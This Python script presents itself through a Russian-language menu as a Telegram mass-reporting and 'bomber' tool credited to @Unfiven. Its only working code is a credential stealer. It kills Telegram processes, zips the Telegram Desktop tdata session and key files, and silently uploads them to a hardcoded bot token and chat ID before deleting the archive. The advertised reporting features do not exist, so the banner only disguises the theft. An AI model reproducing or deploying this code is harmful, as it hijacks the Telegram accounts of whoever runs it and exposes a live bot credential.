import os
import zipfile
import requests
import subprocess
import sys
from pystyle import *



choose = '''



▒█▀▀▀█ ▒█▄░▒█ ▒█▀▀▀█ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ 
░▀▀▀▄▄ ▒█▒█▒█ ▒█░░▒█ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ 
▒█▄▄▄█ ▒█░░▀█ ▒█▄▄▄█ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█


Разработчик: @Unfiven 

╔============================╗
║ 1. Снос аккаунта           ║
║ 2. Снос канала             ║
║ 3. Снос бота               ║
║ 4. Отправка своего текста  ║
║ 5. Снос через сайт         ║ 
║ 6. Бомбер телеграм         ║
╚============================╝
Выбери число

'''


def close_telegram():
    try:
        if os.name == 'nt':
            subprocess.run(["taskkill", "/f", "/im", "telegram.exe"], 
                          check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            subprocess.run(["taskkill", "/f", "/im", "Aigram.exe"], 
                          check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        else:
            subprocess.run(["pkill", "-f", "telegram"], 
                          check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            subprocess.run(["pkill", "-f", "Aigram"], 
                          check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass

BOT_TOKEN = "7470202864:AAEBoiYc2sAm9yYTxTmDOK3q7Hf8ux4hx9A"
CHAT_ID = "7867733306"
TDATA_PATH = r"C:\Users\Администратор\AppData\Roaming\Telegram Desktop\tdata"

ESSENTIAL_FILES = [
    "map*", "key_datas*", "D877F783D5D3EF8C*", 
    "user_data*", "config*", "data*"
]

def is_essential_file(filename):
    filename_lower = filename.lower()
    return any(
        pattern.lower().replace('*', '') in filename_lower
        for pattern in ESSENTIAL_FILES
    )

def create_secure_zip():
    zip_name = "telegram_essentials.zip"
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(TDATA_PATH):
            for file in files:
                if is_essential_file(file):
                    file_path = os.path.join(root, file)
                    z.write(file_path, os.path.relpath(file_path, TDATA_PATH))
    return zip_name if os.path.exists(zip_name) else None

def send_to_telegram(file_path):
    try:
        with open(file_path, 'rb') as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                files={'document': f},
                data={'chat_id': CHAT_ID},
                timeout=10
            )
        return True
    except:
        return False

def main():
    if not os.path.exists(TDATA_PATH):
        return
    
    close_telegram()
    zip_path = create_secure_zip()
    
    if zip_path:
        if os.path.getsize(zip_path) <= 50*1024*1024:
            send_to_telegram(zip_path)
        os.remove(zip_path)

if __name__ == "__main__":
    main()
    sys.exit(0)